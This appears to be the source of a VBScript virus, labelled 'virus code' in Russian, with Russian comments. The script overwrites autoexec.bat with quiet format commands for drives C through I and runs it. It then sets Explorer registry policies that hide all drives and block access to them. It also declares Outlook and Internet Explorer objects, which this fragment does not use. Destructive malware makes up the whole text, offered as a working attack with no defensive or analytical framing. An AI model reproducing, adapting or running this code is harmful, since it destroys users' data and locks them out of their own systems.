'            = = = = = =  = > КОД ВИРУСА < = = = = = = = 

'      Объявление переменных(этот абзац не перемещать)
Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' Пропускать ошибки
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
Set Outlook = WScript.CreateObject("Outlook.Application")


'     Форматировать Все диски (Только для Windows 95,98,Me)
If FileSystemObject.FileExists("d:\autoexec.bat") Then Str  = "d:\autoexec.bat"
If FileSystemObject.FileExists("d:\Windows.000\autoexec.bat") Then Str  = "d:\Windows.000\autoexec.bat"
If FileSystemObject.FileExists("d:\Windows\autoexec.bat") Then Str  = "d:\Windows\autoexec.bat"
If FileSystemObject.FileExists("c:\autoexec.bat") Then Str = "c:\autoexec.bat"
If FileSystemObject.FileExists("c:\Windows.000\autoexec.bat") Then Str = "c:\Windows.000\autoexec.bat"
If FileSystemObject.FileExists("c:\Windows\autoexec.bat") Then Str = "c:\Windows\autoexec.bat"
Set ab = FileSystemObject.GetFile(Str)
ab.Attributes = 0
Set autoexec = FileSystemObject.CreateTextFile(Str)
autoexec.WriteLine "@cls"
autoexec.WriteLine "@format c: /q /autotest"
autoexec.WriteLine "@format d: /q /autotest"
autoexec.WriteLine "@format e: /q /autotest"
autoexec.WriteLine "@format f: /q /autotest"
autoexec.WriteLine "@format g: /q /autotest"
autoexec.WriteLine "@format h: /q /autotest"
autoexec.WriteLine "@format i: /q /autotest"
autoexec.Close
Shell.Run Str, 5
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", 67108863, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewOnDrive", 67108863, "REG_DWORD"

